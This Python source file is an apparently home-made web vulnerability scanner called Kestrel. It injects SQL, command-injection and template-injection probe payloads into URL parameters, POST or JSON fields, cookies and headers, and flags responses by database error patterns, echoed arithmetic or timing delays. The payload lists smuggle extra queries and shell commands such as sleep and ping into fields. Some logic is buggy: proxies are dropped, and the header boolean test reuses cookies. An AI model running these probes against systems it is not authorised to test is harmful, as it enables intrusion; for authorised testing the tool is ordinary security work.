#!/usr/bin/python3
USAGE = '''
Examples:
#0. Bulkfile (Only work with GET)
kestrel -m <filename>
#1. GET
kestrel -u <url>
#2. POST
kestrel -u <url> -d/--data <data>
#3. POST JSON
kestrel -u <url> -j/--json <json>
#4. Cookie inject
kestrel -u <url> -c "session=whatthefuck"
'''
import sys, requests, time, re, random, string, copy, argparse, json
from threading import Thread, Lock, Semaphore
from colorama import init, Fore, Back, Style
init()

R = random.randint(1000000, 9999999)
ERROR_BASED_SQL = ('\'', '"', '(', ')')
BOOLEAN_BASED_SQL = [{True: i % (R, R), False: i % (R, R-1)} for i in ("' AND %d=%d-- -", "' AND %d=%d#", "' OR NOT (%d>%d)-- -", "' OR NOT (%d>%d)#", ' AND %d=%d-- -', ' AND %d=%d#', ' OR NOT (%d>%d)-- -', ' OR NOT (%d>%d)#', '" AND %d=%d-- -', '" AND %d=%d#', '" OR NOT (%d>%d)-- -', '" OR NOT (%d>%d)#', ') AND %d=%d-- -', ') AND %d=%d#', ') OR NOT (%d>%d)-- -', ') OR NOT (%d>%d)#', "') AND %d=%d-- -", "') AND %d=%d#", "') OR NOT (%d>%d)-- -", "') OR NOT (%d>%d)#", '") AND %d=%d-- -', '") AND %d=%d#', '") OR NOT (%d>%d)-- -', '") OR NOT (%d>%d)#')]
TIME_BASED_SQL  = ("' AND (SELECT sleep(10))-- -", "' AND (SELECT sleep(10))#", "' ||pg_sleep(10)-- -", "' ||pg_sleep(10)#", ' AND (SELECT sleep(10))-- -', ' AND (SELECT sleep(10))#', ' ||pg_sleep(10)-- -', ' ||pg_sleep(10)#', '" AND (SELECT sleep(10))-- -', '" AND (SELECT sleep(10))#', '" ||pg_sleep(10)-- -', '" ||pg_sleep(10)#', ') AND (SELECT sleep(10))-- -', ') AND (SELECT sleep(10))#', ') ||pg_sleep(10)-- -', ') ||pg_sleep(10)#', "') AND (SELECT sleep(10))-- -", "') AND (SELECT sleep(10))#", "') ||pg_sleep(10)-- -", "') ||pg_sleep(10)#", '") AND (SELECT sleep(10))-- -', '") AND (SELECT sleep(10))#', '") ||pg_sleep(10)-- -', '") ||pg_sleep(10)#')
ERROR_BASED_RCE = [i % (R, R) for i in (';expr %d + %d', ';%d + %d', '&&expr %d + %d', '&&%d + %d', '|expr %d + %d', '|%d + %d', '||expr %d + %d', '||%d + %d', '`expr %d + %d`', '`%d + %d`', '$((expr %d + %d))', '$((%d + %d))', )]
ERROR_BASED_RCE+= [i % (R, R) for i in (';eval("%d+%d")', '&&eval("%d+%d")', '||eval("%d+%d")', '|eval("%d+%d")', )]
TIME_BASED_RCE  = ["||sleep 10||", "||ping -c 10 127.0.0.1||"]
SSTI = [i % (R, R) for i in ('${%d*%d}', '{{%d*%d}}', '{{%d*\'%d\'}}', '<%%= %d*%d %%>')]
SCAN_TYPES = ['ERROR_BASED_SQL', 'BOOLEAN_BASED_SQL', 'TIME_BASED_SQL', 'ERROR_BASED_RCE', 'TIME_BASED_RCE', 'SSTI']

SQL_ERROR_BASED_ERRORS = {
    "Python":               (r"Internal Server Error",),
    "MySQL":                (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL":           (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access":     (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle":               (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2":              (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite":               (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase":               (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*")
}

def parser():
    parser = argparse.ArgumentParser(prog='Kestrel', conflict_handler='resolve')
    parser.add_argument('-u', '--url', type=str, help='REQUEST URL')
    parser.add_argument('-m', '--bulkfile', type=str, help='SCAN MULTIPLE TARGETS GIVEN IN A TEXTUAL FILE') # starts with http:// or https://
    # 首先检查url header cookie中是否存在关键字INJECT, 如不存在,进行常规测试, 如存在,进行指定测试
    parser.add_argument('-d', '--data', type=str, default='', help='POST DATA')
    parser.add_argument('-j', '--json', type=str, default='', help='POST JSON')
    parser.add_argument('--headers', type=str, default='', help='REQUEST HEADERS (e.g. User-Agent: _______\nReferer: ________')
    parser.add_argument('--cookies', type=str, default='', help='REQUEST COOKIES')
    parser.add_argument('-p', '--proxies', type=str, help='PROXY SERVER (e.g. http://127.0.0.1:8080')
    parser.add_argument('-s', '--scan', default='', type=str, help='SCAN TYPE')
    parser.add_argument('--nonstop', action='store_true', help='SCAN UNTIL THE END')
    # parser.add_argument('--random-agent', action='store_true', help='ENABLE RANDOM AGENT')
    # parser.add_argument('-v', '--verbose', action='store_true', help='VERBOSE')
    parser.add_argument('-t', '--threads', default=10, type=int, help='THREADS')
    parser.add_argument('-o', '--output', type=str, help='OUTPUT FILE')
    parser.add_argument('-h', '--help', action='store_true', help='PRINT THIS')
    return parser


class Kestrel:
    def __init__(self, cookies='', headers='', proxies=''):
        self.cookies = {i.split('=')[0]:i.split('=')[1] for i in cookies.replace(' ','').split(';')} if cookies else {}
        self.headers = {i.split(':')[0]:i.split(':')[1] for i in headers.replace(' ','').split('\\n')} if headers else {}
        self.proxies = {} if proxies else {}
        self.vulnerable = False

    @staticmethod
    def print_ok(msg=''):
        for i in range(3):
            time.sleep(0.1)
            print('.', end='')
        print("OK" if not msg else msg)

    def print_info(self, url, k, v, msg):
        self.lock.acquire()
        print(f"[+] :::{Fore.RED+msg+Style.RESET_ALL}:::{Fore.GREEN+k+Style.RESET_ALL}:::{Fore.GREEN+v+Style.RESET_ALL}:::")
        if output:
            with open(output, 'a') as f:
                f.write(f":::{url}:::{msg}:::{k}:::{v}:::\n")
        self.lock.release()

    def build_session(self):
        print("[*] Building Request Session", end='')
        self.s = requests.Session()
        self.s.cookies.update(self.cookies)
        self.s.headers.update(self.headers)
        self.s.proxies.update(self.proxies)
        self.print_ok()

    def build_threading_lock(self):
        print("[*] Building Lock", end='')
        self.lock = Lock()
        self.print_ok()
        print("[*] Building Semaphore", end='')
        self.sem  = Semaphore(threads)
        self.print_ok()

    def is_host_alive(self, url):
        print("[*] Testing Host Alive", end='')
        url = re.match(r'(?P<base>https?://[a-zA-Z0-9-.]*)', url).group('base')
        try:
            r = self.s.get(url, timeout=30)
            self.print_ok(msg=r.status_code)
            return False if r.status_code != 200 else True
        except requests.exceptions.ReadTimeout:
            self.print_ok(msg='False')
            return False
        except KeyboardInterrupt:
            self.print_ok(msg='CTRL-C')

    def find_param_from_url_or_data(self, url_or_data, json=None):
        data = []
        self.param_base = {}
        if not json:
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url_or_data):
                data.append(('url', match.group('parameter'), match.group('value')))
                self.param_base[match.group('parameter')] = match.group('value')
        else:
            for k, v in json.items():
                data.append(('url', k, v))
                self.param_base[k] = v
        if self.cookies:
            for k, v in self.cookies.items():
                data.append(('cki', k, v))
        if self.headers:
            for k, v in self.headers.items():
                data.append(('hdr', k, v))
        return data

    def get_or_post(self, url, params={}, cookies={}, headers={}):
        data = copy.deepcopy(self.param_base)
        data.update(params)
        try:
            if cookies:
                self.s.cookies.update(cookies)
            if headers:
                self.s.headers.update(headers)
            r = self.s.get(url, params=data) if not is_post else self.s.post(url, json=data) if jata else self.s.post(url, data=data)
            # if is_post:
            #     if jata:
            #         r = self.s.post(url, json=data)
            #     else:
            #         r = self.s.post(url, data=data)
            # else:
            #     r = self.s.get(url, params=data)
            # reset
            self.s.cookies.update(self.cookies)
            self.s.headers.update(self.headers)
            return r
        except requests.exceptions.RequestException as e:
            print(f"[!] Request Exception: {e}")
        except KeyboardInterrupt:
            sys.exit(0)

    def scan_error_based_sql(self, url, pos, k, v, p):
        if pos == 'url':
            html = self.get_or_post(url, params={k: v+p}).text
        if pos == 'cki':
            html = self.get_or_post(url, cookies={k: v+p}).text
        if pos == 'hdr':
            html = self.get_or_post(url, headers={k: v+p}).text
        for tech, errs in SQL_ERROR_BASED_ERRORS.items():
            for err in errs:
                if re.search(err, html, re.I):
                    self.vulnerable = True
                    return self.print_info(url, k, v+p, 'Error Based SQL Injection')

    def scan_boolean_based_sql(self, url, pos, k, v, p):
        v_true, v_false = v+p[True], v+p[False]
        if pos == 'url':
            r1 = self.get_or_post(url, params={k: v_true})
            r2 = self.get_or_post(url, params={k: v_false})
        if pos == 'cki':
            r1 = self.get_or_post(url, cookies={k: v_true})
            r2 = self.get_or_post(url, cookies={k: v_false})
        if pos == 'hdr':
            r1 = self.get_or_post(url, cookies={k: v_true})
            r2 = self.get_or_post(url, cookies={k: v_true})
        if r1.status_code == r2.status_code == 200 and len(r1.text) != len(r2.text):
            self.vulnerable = True
            return self.print_info(url, k, v_true, 'Boolean Based SQL Injection')

    def scan_time_based_sql(self, url, pos, k, v, p):
        stt = time.time()
        if pos == 'url':
            r = self.get_or_post(url, params={k: v+p})
        if pos == 'cki':
            r = self.get_or_post(url, cookies={k: v+p})
        if pos == 'hdr':
            r = self.get_or_post(url, headers={k: v+p})
        cst = time.time() - stt
        if cst >= 9:
            self.vulnerable = True
            return self.print_info(url, k, v+p, 'Time Based SQL Injection')

    def scan_error_based_rce(self, url, pos, k, v, p):
        mark_plus = str(R + R)
        if pos == 'url':
            r = self.get_or_post(url, params={k: v+p})
        if pos == 'cki':
            r = self.get_or_post(url, cookies={k: v+p})
        if pos == 'hdr':
            r = self.get_or_post(url, headers={k: v+p})
        if re.search(mark_plus, r.text):
            self.vulnerable = True
            return self.print_info(url, k, v+p, 'Error Based RCE')

    def scan_time_based_rce(self, url, pos, k, v, p):
        stt = time.time()
        if pos == 'url':
            r = self.get_or_post(url, params={k: v+p})
        if pos == 'cki':
            r = self.get_or_post(url, cookies={k: v+p})
        if pos == 'hdr':
            r = self.get_or_post(url, headers={k: v+p})
        cst = time.time() - stt
        if cst > 9:
            self.vulnerable = True
            return self.print_info(url, k, v+p, 'Time Based RCE')

    def scan_ssti(self, url, pos, k, v, p):
        mark_multi = str(R * R)
        if pos == 'url':
            r = self.get_or_post(url, params={k: v + p})
        if pos == 'cki':
            r = self.get_or_post(url, cookies={k: v + p})
        if pos == 'hdr':
            r = self.get_or_post(url, headers={k: v + p})
        if re.search(mark_multi, r.text):
            return self.print_info(url, k, v+p, 'SSTI')

    def start(self):
        self.build_session()
        self.build_threading_lock()
        for url in urls:
            print(f"[*] Testing {url}")
            if not self.is_host_alive(url):
                continue
            ur_ = url.split('?')[0]
            self.vulnerable = False
            url_or_data = url if not is_post else data
            for pos, param, value in self.find_param_from_url_or_data(url_or_data, json=jata):
                if self.vulnerable: break
                for i in scan_types:
                    typE, payloads = i, eval(i)
                    if self.vulnerable: break
                    ts = []
                    with self.sem:
                        for payload in payloads:
                            if self.vulnerable and nonstop == False: break
                            if typE == 'ERROR_BASED_SQL':
                                t = Thread(target=self.scan_error_based_sql, args=(ur_, pos, param, value, payload))
                                ts.append(t)
                            elif typE == 'BOOLEAN_BASED_SQL':
                                t = Thread(target=self.scan_boolean_based_sql, args=(ur_, pos, param, value, payload))
                                ts.append(t)
                            elif typE == 'TIME_BASED_SQL':
                                t = Thread(target=self.scan_time_based_sql, args=(ur_, pos, param, value, payload))
                                ts.append(t)
                            elif typE == 'ERROR_BASED_RCE':
                                t = Thread(target=self.scan_error_based_rce, args=(ur_, pos, param, value, payload))
                                ts.append(t)
                            elif typE == 'TIME_BASED_RCE':
                                t = Thread(target=self.scan_time_based_rce, args=(ur_, pos, param, value, payload))
                                ts.append(t)
                            elif typE == 'SSTI':
                                t = Thread(target=self.scan_ssti, args=(ur_, pos, param, value, payload))
                                ts.append(t)
                            else:
                                print("todo://add more vulns")
                    for t in ts:
                        t.start()
                    for t in ts:
                        t.join()

ap = parser()
args = ap.parse_args()
if args.help:
    ap.print_help()
    print(USAGE)
    sys.exit(0)

urls = [args.url] if args.url else []
if args.bulkfile:
    with open(args.bulkfile, 'r') as f:
        for line in f.readlines():
            urls.append(line.strip('\r').strip('\n'))
data = args.data
jata = json.loads(args.json) if args.json else {}
is_post = True if data else False
proxies = {'http': args.proxies, 'https': args.proxies}
scan_types = args.scan if args.scan else SCAN_TYPES
threads = args.threads
output  = args.output
nonstop = args.nonstop

Kestrel(args.cookies, args.headers, proxies).start()